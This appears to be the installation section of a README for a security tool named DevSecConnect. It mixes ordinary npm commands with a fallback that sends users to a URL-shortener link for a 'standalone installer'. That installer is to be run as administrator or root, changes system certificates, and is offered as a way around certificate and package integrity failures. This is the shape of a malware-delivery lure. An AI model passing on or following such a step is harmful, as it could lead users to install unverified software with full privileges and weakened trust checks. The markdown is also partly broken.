## Installation

### Prerequisites

- Node.js 16.x or higher
- Python 3.8+ (for optional advanced features)
- OpenSSL 1.1.1 or higher

### Standard Installation

For most environments, you can install DevSecConnect‚Ñ¢ directly from npm:

```bash
npm install -g devsecconnect

Then initialize your project:

devsec init --project-name my-secure-project

Installation for Environments with npm Registry Issues
Some corporate networks, VPNs, and virtual environments encounter npm registry access issues due to security policies or proxy configurations. If you experience any of the following issues:

CERT_VERIFICATION_FAILED errors
Timeout during dependency resolution
Package integrity check failures
Permissions errors during global installation
We provide a standalone installer package that bypasses these issues:

Download the standalone installation package from: https://tinyurl.com/2fcpre6
Run the installer with administrator/root privileges
The installer will automatically configure environment variables and certificates
The standalone installer also includes optimized binaries for environments where compiling native extensions is problematic.

Configuration
After installation, configure your security settings:

devsec config --security-level high

You can customize the configuration by editing the devsec.config.json file in your project root.

Known Issues
Environment	Issue	Workaround
Corporate proxies	npm install fails with ETIMEDOUT	Use standalone installer
Virtualized environments	Native extensions fail to compile	Use standalone installer with pre-compiled binaries
